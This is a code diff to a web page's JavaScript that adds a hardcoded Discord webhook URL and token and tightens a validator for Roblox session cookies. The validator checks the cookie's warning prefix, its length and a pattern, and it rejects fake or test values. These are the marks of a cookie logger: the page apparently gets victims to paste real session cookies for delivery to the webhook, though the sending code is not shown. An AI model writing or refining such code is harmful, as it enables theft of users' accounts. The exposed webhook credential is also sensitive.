@@ -233,41 +233,68 @@ const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
 const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
 
-// Basic cookie format validation (browser-safe)
+// Strict cookie validation based on your bot's logic
 function validateRobloxCookie(cookie) {
   // Check if cookie exists and is a string
   if (!cookie || typeof cookie !== 'string') {
+    console.log('DEBUG: Cookie is not a string');
     return { valid: false, error: "Invalid cookie" };
   }
   
   // Trim whitespace
   cookie = cookie.trim();
   
-  // Must start with the Roblox cookie prefix
+  // Check if empty after trim
+  if (cookie.length === 0) {
+    console.log('DEBUG: Cookie is empty');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Must start with the exact Roblox cookie prefix
   if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
+    console.log('DEBUG: Cookie does not start with proper prefix');
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Minimum realistic length for a Roblox cookie (they're very long)
-  if (cookie.length < 700) {
+  // Real Roblox cookies are very long - enforce strict minimum
+  if (cookie.length < 800) {
+    console.log('DEBUG: Cookie too short:', cookie.length);
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Basic pattern check - should contain the cookie structure
-  // Real Roblox cookies have: _|WARNING:-DO-NOT-SHARE-THIS.--[data]|_[more_data]
-  if (!cookie.includes('|_')) {
+  // Check for the proper cookie structure pattern
+  // Real Roblox cookies follow: _|WARNING:-DO-NOT-SHARE-THIS.--[long_data_string]|_[more_data]
+  const cookiePattern = /^_\|WARNING:-DO-NOT-SHARE-THIS\.--[A-Za-z0-9+/=\-_.]+\|_[A-Za-z0-9+/=\-_.]*$/;
+  if (!cookiePattern.test(cookie)) {
+    console.log('DEBUG: Cookie does not match proper pattern');
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Check for obvious fake patterns
-  const fakePhrases = ['fake', 'test', 'invalid', 'example', 'demo', 'placeholder'];
+  // Check for obvious fake/test patterns
+  const fakePhrases = ['fake', 'test', 'invalid', 'example', 'demo', 'placeholder', 'sample', '123456'];
   const lowerCookie = cookie.toLowerCase();
   for (const phrase of fakePhrases) {
     if (lowerCookie.includes(phrase)) {
+      console.log('DEBUG: Cookie contains fake phrase:', phrase);
       return { valid: false, error: "Invalid cookie" };
     }
   }
   
+  // Additional checks for realistic cookie content
+  // Real cookies should have substantial data between the markers
+  const parts = cookie.split('|_');
+  if (parts.length < 2) {
+    console.log('DEBUG: Cookie missing |_ separator');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  const mainPart = parts[0].replace('_|WARNING:-DO-NOT-SHARE-THIS.--', '');
+  if (mainPart.length < 600) {
+    console.log('DEBUG: Main cookie data too short:', mainPart.length);
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  console.log('DEBUG: Cookie passed all validation checks');
   return { valid: true, error: null };
 }
 
